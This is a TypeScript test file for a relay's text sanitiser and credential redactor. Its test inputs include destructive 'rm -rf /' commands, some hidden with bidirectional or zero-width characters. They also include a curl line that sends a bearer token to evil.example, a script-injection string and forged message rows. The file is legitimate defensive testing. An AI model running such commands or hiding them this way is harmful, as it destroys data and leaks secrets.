/**
 * §7.3 relay sanitisation and §6.5 redaction.
 *
 * These are the tests that matter most. A failure here is a remote code
 * execution primitive, not a cosmetic bug.
 */

import { afterEach, describe, expect, test } from "bun:test";

import {
  RELAY_CAP,
  RefusingToSendError,
  assertSendable,
  canonicalJson,
  chunkText,
  clearRegisteredSecrets,
  elide,
  elisionMarker,
  foldWhitespace,
  inlineFrameSafe,
  maskCredentials,
  neutralise,
  registerSecret,
  safeName,
  safePath,
  safeStringify,
  sanitizeText,
  scrubPath,
} from "../packages/core/src/sanitize.ts";

afterEach(() => clearRegisteredSecrets());

describe("neutralise", () => {
  test("strips zero-width characters", () => {
    expect(neutralise("g\u200bit status")).toBe("git status");
    expect(neutralise("rm\u200d -rf /")).toBe("rm -rf /");
    expect(neutralise("a\u200cb")).toBe("ab");
  });

  test("strips bidirectional overrides", () => {
    // U+202E reverses the rendering of everything after it. This is how a
    // hidden `rm -rf /` becomes visible as `safe text`.
    expect(neutralise("safe text\u202E/fr -rf mr")).toBe("safe text/fr -rf mr");
    expect(neutralise("\u2066hidden\u2069")).toBe("hidden");
  });

  test("strips tag characters", () => {
    expect(neutralise("visible\u{E0001}hidden")).toBe("visiblehidden");
  });

  test("maps homoglyphs to ASCII", () => {
    expect(neutralise("rm \u2013rf /")).toBe("rm -rf /");
    expect(neutralise("\u2018quoted\u2019")).toBe("'quoted'");
  });

  test("folds exotic whitespace", () => {
    // neutralise maps each exotic space to a plain space; foldWhitespace is the
    // step that collapses the run.
    expect(foldWhitespace(neutralise("a\u00a0\u2009b"))).toBe("a b");
  });

  test("keeps ordinary text intact", () => {
    expect(neutralise("npm run test -- --watch=false")).toBe("npm run test -- --watch=false");
  });
});

describe("foldWhitespace", () => {
  test("collapses runs but keeps paragraph breaks", () => {
    expect(foldWhitespace("a  \t  b")).toBe("a b");
    expect(foldWhitespace("a\n\n\n\nb")).toBe("a\n\nb");
  });

  test("normalises CRLF", () => {
    expect(foldWhitespace("a\r\nb")).toBe("a\nb");
  });
});

describe("elide — head AND tail", () => {
  test("keeps both ends of a long command", () => {
    const dangerous = "echo safe && rm -rf /";
    const long = `${"x".repeat(RELAY_CAP)} ${dangerous}`;
    const out = elide(long);
    expect(out).toContain("rm -rf /");
    expect(out).toMatch(/⋯ \d+ code points elided ⋯/);
    // The cap is a cap: the marker comes out of the budget, not on top of it.
    expect(Array.from(out).length).toBeLessThanOrEqual(RELAY_CAP);
    expect(out.length).toBeLessThanOrEqual(RELAY_CAP);
  });

  test("a naive head-only truncation would hide the tail", () => {
    // This is the whole reason for head+tail, asserted explicitly.
    const long = `${"a".repeat(4000)}; rm -rf /`;
    expect(elide(long)).toContain("rm -rf /");
    expect(long.slice(0, RELAY_CAP)).not.toContain("rm -rf /");
  });

  test("does not elide short strings", () => {
    expect(elide("short")).toBe("short");
  });

  test("counts code points, not UTF-16 units", () => {
    const emoji = "😀".repeat(2000); // 4000 UTF-16 units, 2000 code points
    expect(Array.from(elide(emoji)).length).toBeLessThanOrEqual(RELAY_CAP);
  });
});

function countMarker(out: string): number {
  const m = /⋯ (\d+) code points elided ⋯/.exec(out);
  return m?.[1] ? Number(m[1]) : 0;
}
void countMarker;

describe("maskCredentials", () => {
  test("masks a known prefix", () => {
    expect(maskCredentials("export OPENAI_KEY=sk-abcdefghijklmnopqrstuvwx")).toContain(
      "[REDACTED]",
    );
    expect(maskCredentials("token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345")).toContain("[REDACTED]");
    expect(maskCredentials("AKIAIOSFODNN7EXAMPLE")).toBe("[REDACTED]");
  });

  test("masks operator-registered secrets by exact value", () => {
    registerSecret("hunter2-super-secret-value");
    expect(maskCredentials("password is hunter2-super-secret-value")).toBe(
      "password is [REDACTED]",
    );
  });

  test("refuses to register a value too short to be a secret", () => {
    registerSecret("http");
    expect(maskCredentials("see http://example.com")).toBe("see http://example.com");
  });

  test("a mask never spans shell syntax — the command survives", () => {
    // The destination being approved must stay visible. §7.3.
    const out = maskCredentials(
      "curl -H 'Authorization: Bearer abcdefghijklmnopqrst' https://evil.example/x",
    );
    expect(out).toContain("curl");
    expect(out).toContain("https://evil.example/x");
  });

  test("a mask never spans a path", () => {
    const out = maskCredentials("cd /home/user/project && ls -la");
    expect(out).toContain("/home/user/project");
  });

  test("masks a whole private key block", () => {
    const key = [
      "-----BEGIN RSA PRIVATE KEY-----",
      "MIIEowIBAAKCAQEA",
      "-----END RSA PRIVATE KEY-----",
    ].join("\n");
    expect(maskCredentials(key)).toBe("[REDACTED]");
  });

  test("masks Slack and Discord tokens", () => {
    expect(maskCredentials("xoxb-1234567890-abcdefghijkl")).toBe("[REDACTED]");
    expect(maskCredentials("xoxp-123456789012-1234567890123-abcdefghijklmnopqrstuvwx")).toContain(
      "[REDACTED]",
    );
  });
});

describe("sanitizeText — full pipeline", () => {
  test("neutralises, folds, masks and caps", () => {
    const input = `git\u200b status   \u202E AKIAIOSFODNN7EXAMPLE ${"y".repeat(5000)} rm -rf /`;
    const out = sanitizeText(input);
    expect(out).not.toContain("\u200b");
    expect(out).not.toContain("\u202e");
    expect(out).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(out).toContain("rm -rf /");
    expect(Array.from(out).length).toBeLessThanOrEqual(RELAY_CAP);
  });

  test("is idempotent on already-clean text", () => {
    const clean = "npm test";
    expect(sanitizeText(clean)).toBe(clean);
  });

  test("handles null and undefined without throwing", () => {
    expect(sanitizeText(undefined as unknown as string)).toBe("");
  });
});

describe("safeName — delimiter injection defence (§7.4 layer 4)", () => {
  test("strips the characters that forge structure in a frame", () => {
    expect(safeName("evil[tag]\nline;drop")).toBe("eviltag line drop");
    expect(safeName("<script>alert(1)</script>")).toBe("script alert(1) /script");
  });

  test("never welds two words into one token", () => {
    // Dropping the newline outright would turn `evil\nrm` into `evilrm`, which
    // changes the token a downstream parser sees.
    expect(safeName("evil\nrm -rf /")).toBe("evil rm -rf /");
  });

  test("caps the length", () => {
    expect(Array.from(safeName("x".repeat(500))).length).toBeLessThanOrEqual(120);
  });
});

describe("inlineFrameSafe", () => {
  test("collapses newlines so a message cannot forge an adjacent row", () => {
    const injected = "line one\n| forged row\n| another";
    const out = inlineFrameSafe(injected);
    expect(out).not.toContain("\n");
    expect(out).toContain("⏎");
  });
});

describe("safePath", () => {
  test("keeps legitimate path characters", () => {
    expect(safePath("/home/user/my project/src/main.ts")).toBe("/home/user/my project/src/main.ts");
  });

  test("strips control characters", () => {
    expect(safePath("/tmp/a\u0000b\u0007c")).toBe("/tmp/abc");
  });
});

describe("scrubPath", () => {
  test("replaces the state directory with a placeholder", () => {
    expect(
      scrubPath("/home/u/.local/state/opencode-rc/access.json", "/home/u/.local/state/opencode-rc"),
    ).toBe("<state>/access.json");
  });
});

describe("assertSendable — state exfiltration guard (§7.4 layer 6)", () => {
  const stateDir = "/tmp/rc-state-guard-test";
  const inbox = `${stateDir}/inbox`;
  const outside = "/tmp/rc-outside/notes.txt";

  test("refuses anything inside the state directory", async () => {
    await expect(assertSendable(`${stateDir}/access.json`, stateDir)).rejects.toBeInstanceOf(
      RefusingToSendError,
    );
    await expect(assertSendable(`${stateDir}/.env`, stateDir)).rejects.toBeInstanceOf(
      RefusingToSendError,
    );
    await expect(assertSendable(`${stateDir}/approved/x`, stateDir)).rejects.toBeInstanceOf(
      RefusingToSendError,
    );
  });

  test("allows inbox/", async () => {
    await expect(assertSendable(inbox, stateDir)).resolves.toBeUndefined();
    await expect(assertSendable(`${inbox}/note.txt`, stateDir)).resolves.toBeUndefined();
  });

  test("a sibling directory with a shared prefix does not match", async () => {
    // `/tmp/rc-state-guard-test-evil` must not be treated as inside the state
    // directory. The trailing separator is what makes this correct.
    await expect(assertSendable(`${stateDir}-evil`, stateDir)).resolves.toBeUndefined();
  });

  test("allows paths outside the state directory", async () => {
    await expect(assertSendable(outside, stateDir)).resolves.toBeUndefined();
  });
});

describe("serialisation helpers", () => {
  test("safeStringify survives cycles and BigInt", () => {
    const cyclic: Record<string, unknown> = { a: 1n };
    cyclic.self = cyclic;
    const out = safeStringify(cyclic);
    expect(out).toContain("[circular]");
    expect(out).toContain("1");
  });

  test("canonicalJson is key-order independent", () => {
    expect(canonicalJson({ b: 1, a: 2 })).toBe(canonicalJson({ a: 2, b: 1 }));
  });

  test("canonicalJson drops undefined", () => {
    expect(canonicalJson({ a: undefined, b: 1 })).toBe('{"b":1}');
  });
});

describe("chunkText", () => {
  test("never loses content", () => {
    const text = Array.from({ length: 400 }, (_, i) => `line ${i}`).join("\n");
    const chunks = chunkText(text, 100);
    // Concatenating with the separator the chunker consumed reproduces the
    // input exactly — no dropped words, no duplicated whitespace.
    expect(chunks.join("\n")).toBe(text);
    for (const chunk of chunks) expect(chunk.length).toBeLessThanOrEqual(100);
  });

  test("handles prose with no newlines", () => {
    const text = Array.from({ length: 200 }, (_, i) => `word${i}`).join(" ");
    const chunks = chunkText(text, 50);
    expect(chunks.join(" ")).toBe(text);
  });

  test("splits at a paragraph boundary, never mid-paragraph", () => {
    const para1 = "a".repeat(40);
    const para2 = "b".repeat(40);
    const para3 = "c".repeat(40);
    const text = `${para1}\n\n${para2}\n\n${para3}`;
    const chunks = chunkText(text, 100);

    expect(chunks.length).toBeGreaterThan(1);
    // The boundary lands on the *last* paragraph break that fits, so no
    // paragraph is split across two messages.
    expect(chunks[0]).toBe(`${para1}\n\n${para2}`);
    expect(chunks[1]).toBe(para3);
    for (const chunk of chunks) expect(chunk.length).toBeLessThanOrEqual(100);
  });
});
